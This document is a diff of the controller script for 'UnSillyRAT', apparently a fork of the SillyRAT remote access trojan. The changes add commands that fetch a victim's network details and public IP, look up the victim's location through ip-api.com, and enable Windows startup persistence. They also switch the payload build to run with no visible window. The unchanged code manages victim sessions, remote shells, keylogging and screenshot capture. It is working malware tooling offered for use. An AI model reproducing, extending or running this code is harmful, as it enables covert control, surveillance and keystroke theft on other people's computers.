@@ -1,26 +1,28 @@
-import sys
-import os
-import socket
-import time
-import base64
-import tabulate
-import signal
-import subprocess
 import argparse
-import shutil
-import threading
+import base64
+import os
 import platform
-import PyInstaller.__main__
+import shutil
+import signal
+import socket
+import subprocess
+import sys
+import threading
+import time
 from datetime import datetime
 
+import PyInstaller.__main__
+import requests
+import tabulate
+
 __LOGO__ = """
- ____  _ _ _       ____      _  _____
-/ ___|(_) | |_   _|  _ \\    / \\|_   _|
-\\___ \\| | | | | | | |_) |  / _ \\ | |
- ___) | | | | |_| |  _ <  / ___ \\| |
-|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|
-             |___/
-                    %s v1.0 @hash3liZer/@TheFlash2k
+ _   _       ____  _ _ _       ____      _  _____ 
+| | | |_ __ / ___|(_) | |_   _|  _ \    / \|_   _|
+| | | | '_ \\\\___ \\| | | | | | | |_) |  / _ \\ | |  
+| |_| | | | |___) | | | | |_| |  _ <  / ___ \| |  
+ \___/|_| |_|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|  
+                         |___/                    
+                                         %s v1.0
 """
 
 __HELP_OVERALL__ = """usage: python3 sillyray.py command [--help] [--option OPTION]
@@ -29,13 +31,14 @@ These are the commands available for usage:
 
     bind        Run the Server on machine and establish connections
     generate    Generate the Payload file for target platform
+    info        Show information about UnSillyRAT
 
 You can further get help on available commands by supplying
-'--help' argument. For example: 'python3 sillyrat generate --help'
+'--help' argument. For example: 'python3 unsillyrat generate --help'
 will print help manual for generate commmand
 """
 
-__HELP_BIND__   = """usage: python3 sillyrat.py bind [--address ADDRESS] [--port PORT]
+__HELP_BIND__ = """usage: python3 unsillyrat.py bind [--address ADDRESS] [--port PORT]
 
     Args              Description
     -h, --help        Show Help for Bind command
@@ -48,7 +51,7 @@ the command interface
 """
 
 __HELP_GENERATE__ = """
-usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
+usage: python3 unsillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
 
     Args              Description
     -h, --help        Show Help Manual for generate command
@@ -63,6 +66,22 @@ The generate command generates the required payload
 file to be executed on client side. The establish
 connection to server and do commands.
 """
+
+__HELP__INFO___ = """
+UnSillyRAT is a fork of hash3liZer/SillyRAT by @hirusha-adi
+
+The Original Contributers upto now are:
+    + hash3liZer
+    + TheFlash2k
+    + jbsec
+    + weirdo-hash
+
+This fork has three new improved commands, They are:
+    1. networkinfo - Show Network Adapter and IP Info
+    2. publicip - Get the Public IP info of the client
+    3. startup - Start the RAT again on startup (Windows Only)
+"""
+
 
 class PULL:
 
@@ -85,8 +104,8 @@ class PULL:
 
     def support_colors(self):
         plat = sys.platform
-        supported_platform = plat != 'Pocket PC' and (plat != 'win32' or \
-														'ANSICON' in os.environ)
+        supported_platform = plat != 'Pocket PC' and (plat != 'win32' or
+                                                      'ANSICON' in os.environ)
         is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
         if not supported_platform or not is_a_tty:
             return False
@@ -107,54 +126,64 @@ class PULL:
 
     def get_com(self, mss=()):
         if mss:
-            rtval = input(self.DARKCYAN + "$" + self.END + " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] ")
+            rtval = input(self.DARKCYAN + "$" + self.END +
+                          " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] ")
         else:
             rtval = input(self.DARKCYAN + "$" + self.END + " ")
         rtval = rtval.rstrip(" ").lstrip(" ")
         return rtval
 
     def print(self, mess):
-        print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)
+        print(self.GREEN + "[" + self.UNDERLINE + "*" +
+              self.END + self.GREEN + "] " + self.END + mess + self.END)
 
     def function(self, mess):
-        print(self.BLUE + "[" + self.UNDERLINE + ":" + self.END + self.BLUE + "] " + self.END + mess + self.END)
+        print(self.BLUE + "[" + self.UNDERLINE + ":" +
+              self.END + self.BLUE + "] " + self.END + mess + self.END)
 
     def error(self, mess):
-        print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)
+        print(self.RED + "[" + self.UNDERLINE + "!" +
+              self.END + self.RED + "] " + self.END + mess + self.END)
 
     def exit(self, mess=""):
-        sys.exit(self.RED + "[" + self.UNDERLINE + "~" + self.END + self.RED + "] " + self.END + mess + self.END)
+        sys.exit(self.RED + "[" + self.UNDERLINE + "~" +
+                 self.END + self.RED + "] " + self.END + mess + self.END)
 
     def logo(self):
         print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)
 
     def help_c_current(self):
-        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
-        lister  = [
+        headers = (pull.BOLD + 'Command' + pull.END,
+                   pull.BOLD + 'Description' + pull.END)
+        lister = [
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
             ('disconnect', 'Disconnect from Current Client'),
             ('clear', 'Clear Screen'),
-            ('shell'  , 'Launch a New Terminal/Shell.'),
+            ('shell', 'Launch a New Terminal/Shell.'),
             ('keylogger', 'KeyLogger Module'),
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
-            ('exit', 'Exit from SillyRAT!')
+            ('networkinfo', 'Show Network Adapter and IP Info'),
+            ('publicip', 'Get the Public IP info of the client'),
+            ('startup', 'Start the RAT again on startup (Windows Only)'),
+            ('exit', 'Exit from UnSillyRAT!')
         ]
         sys.stdout.write("\n")
         print(tabulate.tabulate(lister, headers=headers))
         sys.stdout.write("\n")
 
     def help_c_general(self):
-        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
-        lister  = [
+        headers = (pull.BOLD + 'Command' + pull.END,
+                   pull.BOLD + 'Description' + pull.END)
+        lister = [
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
             ('disconnect', 'Disconnect from Current Client'),
             ('clear', 'Clear Screen'),
-            ('exit', 'Exit from SillyRAT!')
+            ('exit', 'Exit from UnSillyRAT!')
         ]
         sys.stdout.write("\n")
         print(tabulate.tabulate(lister, headers=headers))
@@ -174,8 +203,9 @@ class PULL:
         print("Arguments  : Session ID")
         print("Example    : \n")
         print("$ connect 56\n")
-        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
-        lister  = [
+        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD +
+                   'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
+        lister = [
             ('ID', 'integer', 'ID of the sessions from the list')
         ]
         print(tabulate.tabulate(lister, headers=headers))
@@ -213,8 +243,9 @@ class PULL:
         print("$ keylogger on")
         print("$ keylogger off")
         print("$ keylogger dump\n")
-        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Description' + pull.END)
-        lister  = [
+        headers = (pull.BOLD + 'Argument' + pull.END,
+                   pull.BOLD + 'Description' + pull.END)
+        lister = [
             ('on', 'Turn Keylogger on'),
             ('off', 'Turn Keylogger off'),
             ('dump', 'Dump keylogs')
@@ -238,6 +269,22 @@ class PULL:
         print("$ screenshot")
         sys.stdout.write("\n")
 
+    def help_c_networkinfo(self):
+        sys.stdout.write("\n")
+        print("Info       : Get the Local Network Adapter IP Info")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ networkinfo")
+        sys.stdout.write("\n")
+
+    def help_c_publicip(self):
+        sys.stdout.write("\n")
+        print("Info       : Get the target's Public IP")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ publicip")
+        sys.stdout.write("\n")
+
     def help_overall(self):
         global __HELP_OVERALL__
         print(__HELP_OVERALL__)
@@ -253,18 +300,25 @@ class PULL:
         print(__HELP_GENERATE__)
         sys.exit(0)
 
+    def help_info(self):
+        global __HELP__INFO___
+        print(__HELP__INFO___)
+        sys.exit(0)
+
+
 pull = PULL()
+
 
 class CLIENT:
 
     STATUS = "Active"
     MESSAGE = ""
-    KEY     = ")J@NcRfU"
+    KEY = ")J@NcRfU"
 
     def __init__(self, sock, addr):
-        self.sock    = sock
-        self.ip      = addr[0]
-        self.port    = addr[1]
+        self.sock = sock
+        self.ip = addr[0]
+        self.port = addr[1]
 
     def acceptor(self):
         data = ""
@@ -278,9 +332,11 @@ class CLIENT:
             data += chunk.decode('utf-8')
             if self.KEY.encode('utf-8') in chunk:
                 try:
-                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
+                    self.MESSAGE = base64.decodebytes(data.rstrip(
+                        self.KEY).encode('utf-8')).decode('utf-8')
                 except UnicodeDecodeError:
-                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
+                    self.MESSAGE = base64.decodebytes(
+                        data.rstrip(self.KEY).encode('utf-8'))
                 if not self.MESSAGE:
                     self.MESSAGE = " "
                 data = ""
@@ -291,7 +347,8 @@ class CLIENT:
         t.start()
 
     def send_data(self, val):
-        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))
+        self.sock.send(base64.encodebytes(
+            val.encode('utf-8')) + self.KEY.encode('utf-8'))
 
     def recv_data(self):
         while not self.MESSAGE:
@@ -303,11 +360,12 @@ class CLIENT:
         self.MESSAGE = ""
         return rtval
 
+
 class COMMCENTER:
 
     CLIENTS = []
     COUNTER = 0
-    CURRENT = ()    #### Current Target Client ####
+    CURRENT = ()  # Current Target Client ####
     KEYLOGS = []
 
     def c_help(self, vals):
@@ -328,6 +386,10 @@ class COMMCENTER:
                 pull.help_c_sysinfo()
             elif vals[1] == "screenshot":
                 pull.help_c_screenshot()
+            elif vals[1] == "publicip":
+                pull.help_c_publicip()
+            elif vals[1] == "networkinfo":
+                pull.help_c_networkinfo()
         else:
             if self.CURRENT:
                 pull.help_c_current()
@@ -362,7 +424,8 @@ class COMMCENTER:
         self.CURRENT = ()
 
     def c_sessions(self):
-        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
+        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END,
+                   pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
         lister = []
 
         for client in self.CLIENTS:
@@ -390,7 +453,7 @@ class COMMCENTER:
                         self.CURRENT[1].send_data(val)
                         result = self.CURRENT[1].recv_data()
                         if result.strip(" "):
-                          print(result)
+                            print(result)
                     else:
                         break
         else:
@@ -422,17 +485,20 @@ class COMMCENTER:
                     self.CURRENT[1].send_data("keylogger:dump")
                     result = self.CURRENT[1].recv_data()
                     dirname = os.path.dirname(__file__)
-                    dirname = os.path.join( dirname, 'keylogs' )
+                    dirname = os.path.join(dirname, 'keylogs')
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+                    dirname = os.path.join(dirname, '%s' %
+                                           (self.CURRENT[1].ip))
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
-                    fl = open( fullpath, 'w' )
-                    fl.write( result )
+                    fullpath = os.path.join(
+                        dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt"))
+                    fl = open(fullpath, 'w')
+                    fl.write(result)
                     fl.close()
-                    pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
+                    pull.print(
+                        "Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
 
                 else:
                     pull.error("Invalid Syntax!")
@@ -450,20 +516,63 @@ class COMMCENTER:
         else:
             pull.error("You need to connect before execute this command!")
 
+    def c_networkinfo(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("networkinfo:")
+            result = self.CURRENT[1].recv_data()
+            if result.strip(" "):
+                print(result)
+        else:
+            pull.error("You need to connect before execute this command!")
+
+    def c_publicip(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("publicip:")
+            result = self.CURRENT[1].recv_data()
+            if result.strip(" "):
+                ipinfor = requests.get(
+                    "http://ip-api.com/json/" + str(result).strip()).json()
+
+                headers = (pull.BOLD + 'Information' + pull.END,
+                           pull.BOLD + 'Value' + pull.END)
+                lister = [
+                    ('IP', str(result).strip()),
+                    ('Country', str(ipinfor["country"])),
+                    ('Country Code', str(ipinfor["countryCode"])),
+                    ('Region', str(ipinfor["region"])),
+                    ('Region Name', str(ipinfor["regionName"])),
+                    ('City', str(ipinfor["city"])),
+                    ('Zip Code', str(ipinfor["zip"])),
+                    ('Latitude', str(ipinfor["lat"])),
+                    ('Longitude', str(ipinfor["lon"])),
+                    ('Timezone', str(ipinfor["timezone"])),
+                    ('ISP', str(ipinfor["isp"])),
+                    ('Org', str(ipinfor["org"])),
+                    ('AS', str(ipinfor["as"])),
+                    ('exit', 'Exit from UnSillyRAT!')
+                ]
+                sys.stdout.write("\n")
+                print(tabulate.tabulate(lister, headers=headers))
+                sys.stdout.write("\n")
+
+        else:
+            pull.error("You need to connect before execute this command!")
+
     def c_screenshot(self):
         if self.CURRENT:
             self.CURRENT[1].send_data("screenshot:")
             result = self.CURRENT[1].recv_data()
             dirname = os.path.dirname(__file__)
-            dirname = os.path.join( dirname, 'screenshots' )
+            dirname = os.path.join(dirname, 'screenshots')
             if not os.path.isdir(dirname):
                 os.mkdir(dirname)
-            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+            dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
             if not os.path.isdir(dirname):
                 os.mkdir(dirname)
-            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
-            fl = open( fullpath, 'wb' )
-            fl.write( result )
+            fullpath = os.path.join(
+                dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png"))
+            fl = open(fullpath, 'wb')
+            fl.write(result)
             fl.close()
             pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
         else:
@@ -473,14 +582,15 @@ class COMMCENTER:
         sys.stdout.write("\n")
         pull.exit("See Ya!\n")
 
+
 class INTERFACE(COMMCENTER):
 
-    SOCKET  = None
-    RUNNER  = True
+    SOCKET = None
+    RUNNER = True
 
     def __init__(self, prs):
         self.address = prs.address
-        self.port    = prs.port
+        self.port = prs.port
 
     def bind(self):
         self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -516,7 +626,6 @@ class INTERFACE(COMMCENTER):
                 )
             )
 
-
     def accept(self):
         t = threading.Thread(target=self.accept_threads)
         t.daemon = True
@@ -548,9 +657,14 @@ class INTERFACE(COMMCENTER):
                 self.c_sysinfo()
             elif vals[0] == "screenshot":
                 self.c_screenshot()
+            elif vals[0] == "networkinfo":
+                self.c_networkinfo()
+            elif vals[0] == "publicip":
+                self.c_publicip()
 
     def launch(self):
-        pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
+        pull.print(
+            "Launching Interface! Enter 'help' to get avaible commands! \n")
 
         while True:
             val = pull.get_com(self.CURRENT)
@@ -559,6 +673,7 @@ class INTERFACE(COMMCENTER):
     def close(self):
         self.SOCKET.close()
 
+
 class GENERATOR:
 
     data = ""
@@ -566,18 +681,18 @@ class GENERATOR:
 
     def __init__(self, prs):
         self.address = prs.address
-        self.port    = prs.port
-        self.source  = prs.source
+        self.port = prs.port
+        self.source = prs.source
         self.persistence = prs.persistence
-        self.output  = self.get_output(prs.output)
-        self.pather  = self.get_path()
+        self.output = self.get_output(prs.output)
+        self.pather = self.get_path()
         self.v_imports = self.get_imports()
-        self.v_consts  = self.get_consts()
+        self.v_consts = self.get_consts()
         self.v_persistence = self.get_persistence()
         self.v_sysinfo = self.get_sysinfo()
         self.v_screenshot = self.get_screenshot()
-        self.v_client  = self.get_client()
-        self.v_main    = self.get_main()
+        self.v_client = self.get_client()
+        self.v_main = self.get_main()
 
     def get_output(self, out):
         rtval = ""
@@ -660,7 +775,7 @@ class GENERATOR:
         if not os.path.isdir(dirname):
             os.mkdir(dirname)
 
-        fname   = os.path.join(dirname, 'cl.py')
+        fname = os.path.join(dirname, 'cl.py')
 
         return (dirname, fname, 'cl.py')
 
@@ -668,7 +783,7 @@ class GENERATOR:
         time.sleep(2)
         pull.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+            self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating source code ...")
         fl = open(self.output, 'w')
@@ -682,7 +797,7 @@ class GENERATOR:
         time.sleep(2)
         pull.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+            self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating one time code for binary ")
         self.flname = self.tmp_dir()
@@ -698,7 +813,7 @@ class GENERATOR:
         t = threading.Thread(target=PyInstaller.__main__.run, args=([
             '--name=%s' % os.path.basename(self.output),
             '--onefile',
-            '--windowed',
+            '--nowindow',
             '--log-level=ERROR',
             '--distpath=%s' % os.path.dirname(self.output),
             '--workpath=%s' % self.flname[0],
@@ -708,7 +823,8 @@ class GENERATOR:
         t.start()
 
         while t.is_alive():
-            sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END + pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
+            sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END +
+                             pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
             time.sleep(1)
             counter += 1
 
@@ -720,23 +836,26 @@ class GENERATOR:
         shutil.rmtree(self.flname[0])
         pull.print("File: " + self.output)
 
+
 class PARSER:
 
-    COMMANDS = ['bind', 'generate']
+    COMMANDS = ['bind', 'generate', 'info']
 
     def __init__(self, prs):
-        self.mode    = self.v_mode(prs.mode, prs.help)
-        self.help    = self.v_help(prs.help)
+        self.mode = self.v_mode(prs.mode, prs.help)
+        self.help = self.v_help(prs.help)
 
         if self.mode == "bind":
             self.address = self.v_address(prs.address)
-            self.port    = self.v_port(prs.port)
+            self.port = self.v_port(prs.port)
         elif self.mode == "generate":
             self.address = self.v_address(prs.address)
-            self.port    = self.v_port(prs.port)
-            self.output  = self.v_output(prs.output)
-            self.source  = prs.source
+            self.port = self.v_port(prs.port)
+            self.output = self.v_output(prs.output)
+            self.source = prs.source
             self.persistence = prs.persistence
+        elif self.mode == "info":
+            pull.help_info()
 
     def v_help(self, hl):
         if hl:
@@ -747,8 +866,10 @@ class PARSER:
                     pull.help_bind()
                 elif self.mode == "generate":
                     pull.help_generate()
+                elif self.mode == "info":
+                    pull.help_info()
                 else:
-                    pull.help_help()
+                    pull.help_overall()
 
     def v_address(self, str):
         return str
@@ -781,18 +902,25 @@ class PARSER:
         else:
             pull.exit("You must provide an output Path!")
 
+
 def main():
     pull.logo()
 
     parser = argparse.ArgumentParser(add_help=False)
 
     parser.add_argument('mode', nargs="?", help="Moder")
-    parser.add_argument('-h', '--help'   , dest="help"   , default=False, action="store_true", help="Help Manual")
-    parser.add_argument('-a', '--address', dest="address", default="", type=str, help="Address to Bind to")
-    parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
-    parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")
-    parser.add_argument('-s', '--source' , dest="source" , default=False, action="store_true", help="Source file")
-    parser.add_argument('--persistence'  , dest="persistence", default=False, action="store_true", help="Persistence")
+    parser.add_argument('-h', '--help', dest="help",
+                        default=False, action="store_true", help="Help Manual")
+    parser.add_argument('-a', '--address', dest="address",
+                        default="", type=str, help="Address to Bind to")
+    parser.add_argument('-p', '--port', dest="port",
+                        default=0, type=int, help="Port to Bind to")
+    parser.add_argument('-o', '--output', dest="output", default="",
+                        type=str, help="Complete Path to Output File!")
+    parser.add_argument('-s', '--source', dest="source",
+                        default=False, action="store_true", help="Source file")
+    parser.add_argument('--persistence', dest="persistence",
+                        default=False, action="store_true", help="Persistence")
 
     parser = parser.parse_args()
 
@@ -814,6 +942,9 @@ def main():
             generator.compile()
             generator.clean()
         pull.function("Done")
+    elif parser.mode == "info":
+        print(__HELP__INFO___)
+
 
 if __name__ == "__main__":
     main()
